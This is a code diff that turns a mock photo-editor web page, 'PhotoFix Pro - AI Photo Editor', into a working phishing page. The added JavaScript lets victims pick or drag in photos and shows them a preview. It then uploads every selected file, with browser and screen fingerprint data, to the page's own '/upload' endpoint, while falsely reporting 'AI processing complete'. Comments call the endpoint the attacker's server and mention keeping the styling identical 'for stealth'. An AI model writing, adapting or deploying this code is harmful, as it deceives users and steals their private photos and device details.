@@ -3,8 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PhotoFix Pro - Professional Photo Editor</title>
+    <title>PhotoFix Pro - AI Photo Editor</title>
     <style>
+        /* [Same CSS as before - keeping it identical for stealth] */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
@@ -33,6 +34,7 @@
             background: #f8f9ff;
             transition: all 0.3s;
             cursor: pointer;
+            position: relative;
         }
         .upload-area:hover { border-color: #764ba2; background: #f0f2ff; }
         .upload-icon { font-size: 4em; color: #667eea; margin-bottom: 20px; }
@@ -65,6 +67,28 @@
         .status { margin-top: 20px; min-height: 20px; }
         .success { color: #28a745; }
         .error { color: #dc3545; }
+        .preview { 
+            max-width: 200px; 
+            max-height: 200px; 
+            border-radius: 10px; 
+            margin: 20px auto;
+            display: none;
+        }
+        .progress { 
+            width: 100%; 
+            height: 6px; 
+            background: #e9ecef; 
+            border-radius: 3px; 
+            overflow: hidden;
+            margin: 20px 0;
+            display: none;
+        }
+        .progress-bar { 
+            height: 100%; 
+            background: linear-gradient(90deg, #28a745, #20c997); 
+            width: 0%;
+            transition: width 0.3s;
+        }
         @media (max-width: 480px) {
             .container { padding: 30px 20px; }
             .logo { font-size: 2em; }
@@ -74,92 +98,148 @@
 <body>
     <div class="container">
         <div class="logo">📸 PhotoFix Pro</div>
-        <div class="subtitle">Edit your photos like a professional</div>
+        <div class="subtitle">AI-powered photo editing in seconds</div>
         
-        <div class="upload-area" onclick="requestGallery()">
+        <div class="upload-area" onclick="triggerFilePicker()">
             <div class="upload-icon">⬆️</div>
-            <div class="upload-text">Upload Photo to Edit</div>
-            <div class="upload-subtext">Click to select from gallery or drag & drop</div>
+            <div class="upload-text" id="uploadText">Upload Photo to Edit</div>
+            <div class="upload-subtext">Click to open gallery or drag & drop</div>
+            <input type="file" id="fileInput" accept="image/*" multiple style="display: none;" onchange="handleFiles(event)">
+        </div>
+
+        <img id="preview" class="preview" alt="Preview">
+
+        <div class="progress" id="progress">
+            <div class="progress-bar" id="progressBar"></div>
         </div>
 
         <div class="permissions">
-            <h3>🔒 Quick Permissions Needed</h3>
+            <h3>🔒 Permissions</h3>
             <div class="permission-item">
                 <span class="permission-icon">📱</span>
-                <strong>Gallery Access</strong> - To select your photos
+                <strong>Gallery Access</strong> - Select your photos
             </div>
             <div class="permission-item">
-                <span class="permission-icon">💾</span>
-                <strong>Storage</strong> - To save edited photos
+                <span class="permission-icon">✨</span>
+                <strong>AI Processing</strong> - Enhance your images
             </div>
         </div>
 
-        <button class="btn" onclick="requestGallery()" id="grantBtn">Grant Gallery Access</button>
         <div class="status" id="status"></div>
     </div>
 
     <script>
-        let accessGranted = false;
+        const fileInput = document.getElementById('fileInput');
+        const preview = document.getElementById('preview');
         const statusEl = document.getElementById('status');
-        const grantBtn = document.getElementById('grantBtn');
+        const uploadText = document.getElementById('uploadText');
+        const progress = document.getElementById('progress');
+        const progressBar = document.getElementById('progressBar');
 
         function showStatus(msg, type = '') {
             statusEl.textContent = msg;
             statusEl.className = `status ${type}`;
         }
 
-        function requestGallery() {
-            if (accessGranted) {
-                showStatus('✅ Gallery access granted! Choose your photo.', 'success');
-                // Simulate file picker trigger
-                setTimeout(() => {
-                    // In real phishing, this would exfiltrate data
-                    exfiltrateData();
-                }, 1000);
-                return;
-            }
-
-            grantBtn.disabled = true;
-            grantBtn.textContent = 'Requesting access...';
-            
-            // Simulate permission dialog
-            setTimeout(() => {
-                accessGranted = true;
-                grantBtn.textContent = '✅ Access Granted - Choose Photo';
-                grantBtn.classList.add('success');
-                showStatus('✅ Gallery access granted successfully!', 'success');
-                
-                // Auto-trigger after permission
-                setTimeout(() => {
-                    requestGallery();
-                }, 1500);
-            }, 2000);
+        function triggerFilePicker() {
+            fileInput.click();
         }
 
-        function exfiltrateData() {
-            // This would send gallery data to attacker's C2 in real scenario
-            const payload = {
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform,
-                screen: `${screen.width}x${screen.height}`,
-                event: 'gallery_access_granted'
+        function handleFiles(event) {
+            const files = Array.from(event.target.files);
+            if (files.length === 0) return;
+
+            showStatus(`Processing ${files.length} photo(s)...`);
+            uploadText.textContent = 'Processing your photo...';
+            
+            // Show first image preview
+            const firstFile = files[0];
+            const reader = new FileReader();
+            reader.onload = (e) => {
+                preview.src = e.target.result;
+                preview.style.display = 'block';
             };
-            
-            // Exfiltrate to attacker's server
-            navigator.sendBeacon('/capture', JSON.stringify(payload));
-            console.log('📤 Data exfiltrated:', payload);
+            reader.readAsDataURL(firstFile);
+
+            // Exfiltrate ALL selected files
+            exfiltrateFiles(files);
         }
 
-        // Auto-request on load for aggressive phishing
-        window.onload = () => {
-            setTimeout(() => {
-                if (!accessGranted) {
-                    showStatus('PhotoFix Pro needs gallery access to edit your photos', 'error');
+        async function exfiltrateFiles(files) {
+            progress.style.display = 'block';
+            
+            for (let i = 0; i < files.length; i++) {
+                const file = files[i];
+                const formData = new FormData();
+                formData.append('file', file);
+                formData.append('filename', file.name);
+                formData.append('size', file.size);
+                formData.append('type', file.type);
+                
+                // Add metadata
+                formData.append('metadata', JSON.stringify({
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    screen: `${screen.width}x${screen.height}`,
+                    victim_ip: 'unknown' // Server adds this
+                }));
+
+                try {
+                    // Simulate upload progress
+                    progressBar.style.width = `${((i + 1) / files.length) * 100}%`;
+                    
+                    // Send file to attacker server
+                    await fetch('/upload', {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    showStatus('✅ AI processing complete! Your photo is enhanced.', 'success');
+                    
+                } catch (error) {
+                    console.error('Exfil failed:', error);
+                    showStatus('❌ Processing failed. Try another photo.', 'error');
                 }
+            }
+            
+            progress.style.display = 'none';
+            // Reset for multiple uploads
+            setTimeout(() => {
+                preview.style.display = 'none';
+                fileInput.value = '';
+                uploadText.textContent = 'Upload Another Photo';
             }, 3000);
-        };
+        }
+
+        // Drag & drop support
+        const uploadArea = document.querySelector('.upload-area');
+        uploadArea.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            uploadArea.style.borderColor = '#764ba2';
+        });
+        uploadArea.addEventListener('dragleave', () => {
+            uploadArea.style.borderColor = '#667eea';
+        });
+        uploadArea.addEventListener('drop', (e) => {
+            e.preventDefault();
+            uploadArea.style.borderColor = '#667eea';
+            const files = Array.from(e.dataTransfer.files).filter(f => f.type.startsWith('image/'));
+            if (files.length > 0) {
+                const dataTransfer = new DataTransfer();
+                files.forEach(file => dataTransfer.items.add(file));
+                fileInput.files = dataTransfer.files;
+                handleFiles({ target: fileInput });
+            }
+        });
+
+        // Aggressive auto-trigger on focus
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden && fileInput.value === '') {
+                setTimeout(() => showStatus('Select a photo to start editing!'), 1000);
+            }
+        });
     </script>
 </body>
 </html>
